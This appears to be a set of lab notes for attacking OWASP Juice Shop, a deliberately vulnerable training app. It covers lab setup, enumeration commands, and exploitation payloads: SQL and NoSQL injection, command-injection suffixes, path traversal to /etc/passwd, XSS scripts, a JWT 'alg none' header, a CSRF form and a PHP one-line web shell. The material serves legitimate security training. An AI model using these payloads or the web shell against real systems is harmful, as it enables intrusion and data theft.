# 1. Introduction to Juice Shop

## What Juice Shop Is

- A modern, intentionally vulnerable Node.js/Express web application
- Designed to teach OWASP Top 10 vulnerabilities
- Includes realistic e‑commerce features
- Contains dozens of hidden challenges
- Supports CTF mode

## Why Juice Shop Matters

- More realistic than DVWA, Mutillidae, and WebGoat
- Uses modern frameworks (Angular, Node.js, Express)
- Includes real‑world vulnerabilities like JWT abuse, NoSQLi, and race conditions
- Excellent for practicing recon → enumeration → exploitation → reporting

## What Juice Shop Is NOT

- Not a toy app
- Not a simple training platform
- Not representative of hardened enterprise systems

# 3. Lab Setup & Networking

## Recommended Setup

- Kali: NAT + Host‑only
- Juice Shop: Host‑only (via Docker, Node.js, or OWASP BWA)

## Verify Connectivity

```bash
ip a
ping <JuiceShop-IP>
curl -I http://<JuiceShop-IP>:3000
```

## Common Issues

- Node.js not installed
- Wrong port (default is 3000)
- Database not initialized
- Docker container not running

- Hidden routes

# 5. Enumeration Workflows

## Directory Enumeration

```bash
gobuster dir -u http://<IP>:3000 -w /usr/share/wordlists/dirb/common.txt
```

### What to Look For

- `/rest/`
- `/ftp/`
- `/api/`
- `/assets/`
- `/support/`
- `/profile`
- `/administration`

---

## API Enumeration

```bash
curl http://<IP>:3000/rest/products
curl http://<IP>:3000/rest/user/login
curl http://<IP>:3000/rest/feedback
```

---

## Parameter Enumeration

```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hl 0 http://<IP>:3000/rest/products/FUZZ
```

---

## Cookie & Session Enumeration

```bash
curl -I http://<IP>:3000
```

Look for:

- `token` (JWT)
- `language` cookie

---

## Header Enumeration

```bash
curl -I http://<IP>:3000
```

Look for:

- Server version
- CORS misconfigurations
- Missing security headers

# 7. Exploitation Workflows

Below are **school‑level explanations** + **real‑world parallels**.

---

## SQL Injection (Classic)

### Manual Testing

```bash
curl "http://<IP>:3000/rest/products/search?q=' OR 1=1-- -"
```

---

## NoSQL Injection

### Example Payload

```bash
{"email":{"$ne":null},"password":{"$ne":null}}
```

---

## Command Injection

### Test Payloads

```bash
; whoami
&& id
| uname -a
```

---

## Path Traversal

```bash
http://<IP>:3000/ftp/../../../../etc/passwd
```

---

## XSS (Reflected)

```bash
<script>alert(1)</script>
```

---

## XSS (Stored)

```bash
"><script>alert('pwned')</script>
```

---

## JWT Manipulation

### Decode JWT

```bash
jwt-tool -t <token>
```

### Modify Algorithm to None

```bash
{"alg":"none","kid":"../../../../etc/passwd"}
```

---

## CSRF

### Example Attack Form

```html
<form action="http://<IP>:3000/profile" method="POST">
  <input type="hidden" name="username" value="hacked">
  <input type="submit">
</form>
```

---

## File Upload Bypass

### Upload Web Shell

```php
<?php system($_GET['cmd']); ?>
```

### Bypass Filters

- Change extension
- Modify MIME type
- Use polyglots
